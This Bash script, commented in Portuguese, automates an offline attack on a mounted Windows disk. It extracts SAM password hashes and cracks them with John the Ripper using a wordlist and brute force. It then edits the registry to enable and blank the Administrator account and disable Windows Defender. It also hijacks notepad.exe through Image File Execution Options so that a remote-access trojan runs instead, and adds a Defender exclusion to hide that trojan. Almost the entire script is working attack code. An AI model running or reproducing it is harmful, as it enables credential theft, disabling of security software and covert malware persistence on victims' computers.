#!/bin/bash

# --- CONFIGURAÇÕES ---
# O nome e o caminho que o Windows usará internamente
RAT_NAME="Windows.exe"
RAT_PATH="C:\\Windows\\System32\\$RAT_NAME"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[+] Iniciando Processo de Automação (Modo Direto)..."

# 1. LOCALIZAR ONDE VOCÊ MONTOU O DISCO
# O script procura pela pasta Windows dentro do seu ponto de montagem no Kali
MOUNT_POINT=$(find /run/media/kali -maxdepth 3 -name "Windows" -type d 2>/dev/null | sed 's/\/Windows//' | head -n 1)

if [ -z "$MOUNT_POINT" ]; then
    echo "[-] Erro: Não encontrei o Windows montado em /run/media/kali/."
    echo "[!] Certifique-se de que você abriu a pasta do disco no gerenciador de arquivos (Thunar/Nautilus)."
    exit 1
fi

echo "[+] Windows detectado em: $MOUNT_POINT"

# 2. DEFINIR CAMINHOS DAS COLMEIAS (HIVES)
SOFTWARE="$MOUNT_POINT/Windows/System32/config/SOFTWARE"
SYSTEM="$MOUNT_POINT/Windows/System32/config/SYSTEM"
SAM="$MOUNT_POINT/Windows/System32/config/SAM"
DEST_DIR="$HOME/Desktop/Post_Exploitation"
mkdir -p "$DEST_DIR"

# 3. TRATAR WORDLIST (ROCKYOU)
if [ ! -f "$WORDLIST" ]; then
    echo "[!] Descompactando RockYou para o ataque de dicionário..."
    sudo gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$HOME/rockyou.txt"
    WORDLIST="$HOME/rockyou.txt"
fi

# 4. EXTRAÇÃO E ATAQUE HÍBRIDO (JOHN)
echo "[+] Extraindo Hashes..."
sudo samdump2 "$SYSTEM" "$SAM" > "$DEST_DIR/hashes.txt"

echo "[+] ETAPA 1: Ataque de Dicionário (RockYou)..."
john --format=nt --wordlist="$WORDLIST" "$DEST_DIR/hashes.txt"

echo "[+] ETAPA 2: Iniciando Força Bruta (Incremental) em Background..."
john --format=nt --incremental "$DEST_DIR/hashes.txt" &

# 5. INJEÇÃO DE COMANDOS NAS COLMEIAS
echo "[+] Injetando modificações no Registro..."

# A) SAM: Ativar Admin (01f4), Limpar Senha (1) e Desbloquear (2)
printf "1\n01f4\n1\n2\nq\nq\ny\n" | sudo chntpw -i "$SAM" > /dev/null

# B) SYSTEM: Desativar WinDefend e Filtros (Start=4)
printf "cd ControlSet001\\Services\\WinDefend\ned Start\n4\ncd ..\\WdFilter\ned Start\n4\ncd ..\\WdNisSvc\ned Start\n4\nq\ny\n" | sudo chntpw -e "$SYSTEM" > /dev/null

# C) SOFTWARE: Sequestrar o Notepad.exe usando o seu RAT na System32
printf "cd Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\nnk notepad.exe\ncd notepad.exe\nnv 1 Debugger\ned Debugger\n$RAT_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" > /dev/null

# D) SOFTWARE: Adicionar Exclusão de caminho no Defender
printf "cd Microsoft\\Windows Defender\\Exclusions\\Paths\nnv 4 $RAT_PATH\ned $RAT_PATH\n0\nq\ny\n" | sudo chntpw -e "$SOFTWARE" > /dev/null

# 6. FINALIZAÇÃO
echo "--------------------------------------------------"
echo "[!] OPERAÇÃO CONCLUÍDA COM SUCESSO!"
echo "[*] As senhas descobertas aparecerão abaixo:"
john --show --format=nt "$DEST_DIR/hashes.txt"
echo "--------------------------------------------------"
echo "[+] Script finalizado. Lembre-se de copiar seu $RAT_NAME para a System32 do Windows antes de reiniciar!"
